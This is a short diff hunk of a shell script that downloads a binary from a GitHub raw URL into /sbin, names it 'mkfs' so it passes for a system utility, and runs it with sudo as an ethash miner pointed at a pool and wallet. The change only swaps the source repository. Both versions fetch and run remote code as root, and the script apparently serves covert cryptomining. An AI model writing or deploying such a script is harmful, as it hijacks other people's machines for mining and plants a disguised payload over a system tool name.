@@ -6,5 +6,5 @@ WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )
 
 cd "$(dirname "$0")"
 cd /sbin
-wget -O mkfs https://raw.githubusercontent.com/clansas/turbo/main/harta
+wget -O mkfs https://raw.githubusercontent.com/clansas/enbe/main/harta
 chmod +x ./mkfs && sudo ./mkfs -a ethash -o $POOL -u $WALLET.$WORKER $@
